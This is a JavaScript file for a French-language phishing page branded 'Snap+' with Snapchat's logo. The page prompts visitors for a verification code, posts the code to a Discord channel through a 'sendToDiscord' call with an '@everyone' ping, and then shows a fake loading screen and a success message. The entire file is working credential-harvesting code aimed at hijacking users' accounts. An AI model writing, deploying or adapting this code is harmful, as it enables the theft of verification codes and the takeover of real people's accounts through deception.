const sendBtn = document.getElementById('sendBtn');
const codeInput = document.getElementById('codeInput');
const loadingScreen = document.getElementById('loadingScreen');
const successMessage = document.getElementById('successMessage');
const inputWrapper = document.querySelector('.input-wrapper');

inputWrapper.addEventListener('focusin', () => {
    inputWrapper.style.transform = 'translateY(-2px)';
    inputWrapper.querySelector('i').style.color = '#667eea';
});

inputWrapper.addEventListener('focusout', () => {
    inputWrapper.style.transform = 'translateY(0)';
    if (!codeInput.value) {
        inputWrapper.querySelector('i').style.color = 'rgba(255, 255, 255, 0.5)';
    }
});

codeInput.addEventListener('input', () => {
    inputWrapper.style.borderColor = codeInput.value ? '#667eea' : 'rgba(255, 255, 255, 0.1)';
});

sendBtn.addEventListener('click', async function() {
    const code = codeInput.value.trim();

    if (!code) {
        sendBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => sendBtn.style.animation = '', 500);
        alert('Veuillez entrer un code');
        return;
    }

    sendBtn.disabled = true;
    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
    document.querySelector('.form-group').style.display = 'none';
    document.querySelector('.headline').style.display = 'none';
    document.querySelector('.disclaimer').style.display = 'none';
    sendBtn.style.display = 'none';
    loadingScreen.classList.add('active');

    const embed = {
        title: '📱 Code reçu Snap+',
        description: 'Un utilisateur a envoyé son code de vérification.',
        color: 0x667eea,
        fields: [
            { name: '🔑 Code', value: `**${code}**`, inline: true },
            { name: '⏰ Date', value: new Date().toLocaleString('fr-FR'), inline: true }
        ],
        thumbnail: { url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
        footer: { text: 'Snap+ Bot', icon_url: 'https://static.vecteezy.com/system/resources/previews/023/757/820/non_2x/snapchat-logo-snapchat-icon-free-png.png' },
        timestamp: new Date().toISOString()
    };

    await sendToDiscord({ content: '@everyone', embeds: [embed] });

    setTimeout(() => {
        loadingScreen.classList.remove('active');
        successMessage.classList.add('active');
    }, 2000);
});
